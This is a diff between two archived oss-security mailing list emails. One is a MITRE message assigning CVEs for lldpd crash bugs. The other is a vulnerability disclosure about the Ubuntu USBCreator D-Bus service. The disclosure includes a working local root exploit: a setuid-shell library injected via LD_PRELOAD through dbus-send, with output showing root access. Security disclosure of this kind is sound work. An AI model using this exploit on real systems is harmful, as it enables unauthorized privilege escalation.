@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2485" "Thursday" "29" "October" "2015" "20:28:22" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20151030002822.EA52E6C0116@smtpvmsrv1.mitre.org>" "62" "[oss-security] Re: CVE request: lldpd crash in lldp_decode due large management address" nil nil nil "10" "2015103000:28:22" "[oss-security] Re: CVE request: lldpd crash in lldp_decode due large management address" (number mark "        cve-assign@m Oct 29   62/2485  " thread-indent "\"[oss-security] Re: CVE request: lldpd crash in lldp_decode due large management address\"\n") "<871tcvuz3u.fsf@mid.deneb.enyo.de>" ("<871tcvuz3u.fsf@mid.deneb.enyo.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1009" "Wednesday" "22" "April" "2015" "16:50:08" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>" "35" "[oss-security] USBCreator D-Bus service" nil nil nil "4" "2015042223:50:08" "[oss-security] USBCreator D-Bus service" (number mark "        taviso@googl Apr 22   35/1009  " thread-indent "\"[oss-security] USBCreator D-Bus service\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 5350 invoked by uid 550); 30 Oct 2015 00:28:35 -0000
+Received: (qmail 32177 invoked by uid 550); 22 Apr 2015 23:50:45 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,75 +11,72 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 5319 invoked from network); 30 Oct 2015 00:28:34 -0000
-In-Reply-To: <871tcvuz3u.fsf@mid.deneb.enyo.de>
-Message-Id: <20151030002822.EA52E6C0116@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Thu, 29 Oct 2015 20:28:22 -0400 (EDT)
-From: cve-assign@mitre.org
+Received: (qmail 32133 invoked from network); 22 Apr 2015 23:50:40 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to:content-type;
+        bh=gZNujmq8pvbDpOJtVcQSCjF+RwrWG+hlltfUm+eLCVE=;
+        b=I/iRjAZqbI62N2jK5pQNjAFhtHYGhmItMvipsrKhpzzxFu3EMLEt/m1FfHSiJ6BZsg
+         TWjjD3pYw8MrpN1ROUQ3lSl5bTEyQ6ado4vwMwUVwBbW3PJ9oHpe79dUXjzmScrZO62s
+         wWInpCOj/yINESNAlLm2zt4X/3iBps8RnugpwDyHPsn7Reum+DUiaaOMl7JN1QrEgOgt
+         FaZ8laW6UpY0FlHCpf7xNejtqw4vmeE0QE3ySfm7kjW/opwdG+6Q1Lk4ON5vYVZf4S5c
+         dUGSMFwxdnhQBQMnyjL6FokWewE2bRWZcDgmI955b6gHYloPR7jaFVff/fyw3FsCxMLe
+         mI1g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
+         :content-type;
+        bh=gZNujmq8pvbDpOJtVcQSCjF+RwrWG+hlltfUm+eLCVE=;
+        b=K33KXJUJyzCIAQbCdRyrHraDAkqscYTJKB3/1mmcpCcvcOdkdRoWmjP+EXRINMop6X
+         /MUUnlhzR5zQ012jrwMjTUZFIWhTbnh32rXZW6asJbQ2G6Mio2lpjrE/UbGBrIjuEvr4
+         i3KpvPrzxNhytjgjvXEXpc+5/ab7l4Iwpag2n+30UaraQFfQKfM78qUBaVSPRuYg2U6L
+         Rnm3DHpLLVWENtRrFXC8dZTK3X03CbmubIJVIVepAABb7ETbN1V38tbFlflVt5QgF0Ld
+         /X5VveMpZiEuA81E5r/QAHu9jA4RrbS9tU6TnpU9CjJ8f6DhS/ohlOSY9dRm1gMOjsbX
+         v/SA==
+X-Gm-Message-State: ALoCoQkPSFta80M/9zjhHYwZi4iUH9JdmrX8XekMcC9Yp7VdjJDnJde8gsf1PbHOgTqAW+Hn6RHn
+X-Received: by 10.140.105.198 with SMTP id c64mr64056qgf.61.1429746628888;
+ Wed, 22 Apr 2015 16:50:28 -0700 (PDT)
+MIME-Version: 1.0
+Message-ID: <CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Date: Wed, 22 Apr 2015 16:50:08 -0700
+From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE request: lldpd crash in lldp_decode due large management address
-To: fw@deneb.enyo.de
+Subject: [oss-security] USBCreator D-Bus service
+To: oss-security@lists.openwall.com
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-> https://github.com/vincentbernat/lldpd/commit/dd4f16e7e816f2165fba76e3d162cd8d2978dcb2
-> 
-> lldp: fix a buffer overflow when handling management address TLV
-> 
-> When a remote device was advertising a too large management address
-> while still respecting TLV boundaries, lldpd would crash due to a buffer
-> overflow. However, the buffer being a static one, this buffer overflow
-> is not exploitable if hardening was not disabled. This bug exists since
-> version 0.5.6.
+[as-per previous discussion on the vendors list, skipping closed
+discussion of low-severity issue]
 
->> https://github.com/vincentbernat/lldpd/blob/master/configure.ac
+On my Ubuntu VM, I have a D-Bus service listening on
+com.ubuntu.USBCreator. As far as I can tell, this is installed by
+default.
 
->> [AS_HELP_STRING([--enable-hardening],
->>   [Enable compiler and linker options to frustrate memory corruption exploits @<:@default=yes@:>@])],
+It looks like the author intended for all the methods to call
+check_polkit, but KVMTest doesn't.
 
-Based on the
-https://github.com/vincentbernat/lldpd/commit/8738a36d30e2e94257c5b1ae9cd3e7c3d314808e
-commit, there are apparently some platforms, such as the OpenWrt Linux
-distribution, on which hardening must be disabled. Thus, this is a
-relevant exploitable problem in the general case.
+This seems like an obvious mistake, and the following appears to work
+on my machine:
 
-Use CVE-2015-8011.
+$ cat > test.c
+void __attribute__((constructor)) init (void)
+{
+chown("/tmp/test", 0, 0);
+chmod("/tmp/test", 04755);
+}
+^D
+$ gcc -shared -fPIC -o /tmp/test.so test.c
+$ cp /bin/sh /tmp/test
+$ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator
+/com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda
+dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
+method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
+$ ls -l /tmp/test
+-rwsr-xr-x 1 root root 121272 Apr 22 16:43 /tmp/test
+$ /tmp/test
+# id
+euid=0(root) groups=0(root)
 
-
-> https://github.com/vincentbernat/lldpd/commit/793526f8884455f43daecd0a2c46772388417a00
-> 
-> protocols: don't use assert on paths that can be reached
-> 
-> Malformed packets should not make lldpd crash. Ensure we can handle them
-> by not using assert() in this part.
-
-Use CVE-2015-8012.
-
-(Apparently there are various types of malformed packets that can
-cause different problems. However, the code changes themselves are all
-for CWE-617.)
-
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJWMriDAAoJEL54rhJi8gl5QwcQAMzf82elhg+4B1gE2Yg0APUa
-6wTU/GsftPClKuy9zVGNGbajoZgDcrkyqADc45aH4Dpb9G+YK/X6s/B9dgf9KqBj
-3X+5lreJbNKXJlOfZRU9t9J0HH+qRSYa3uVnU19gmLcSG8Z1rJU2JVHVYGha7ujF
-Vh6UozSj/U+hgmfMs9ArXCrjWFEz15kiWr3XmAcVH6ARwtkKNbIadGiz5R5w/dqb
-HF1V7gZHSMz+QHVj/LsMLeuX6Ba6eGFtSAXgrIWKuqZbstTRde2spTUwmB5Njayn
-RUUkIWxQd4oRqNL4ckAj1hIq28GjEreoO3gn2p8CU8On6kc/geHEc2xXt3PBsaZU
-k4R+qY/uq4gFiLjNUdrw9oiCEC5LqFgc2PM1EqzwXlPgvBTvAf6end1DIzf8DLVM
-7WAChlIPTXJL1+mRz6N5xEGdlEEDiCKDpvgCtUNc1b88IHB6Rr51eJgjypxhDAsp
-D8gWfyCwuPps2gSLmipz0LXfb/2DwuzAjcJoZ5rAiWRnmz53asI+2DZMUM2Q6/jF
-kdsgw0lHv5TIO+5MMl/s82s/gmiLbYZ7muvxqzlgCynpTR3UJNs9NDLp6ifLYLAw
-27HxxKBq+vGKbCmtK5pDwE2qth9fSR8k5n/ofBcmuPG2mbKMQMPrDvb87Usq5XOR
-P0vNhiVvQ3oNBE9Ny7UM
-=dhHo
------END PGP SIGNATURE-----
+Thanks, Tavis.
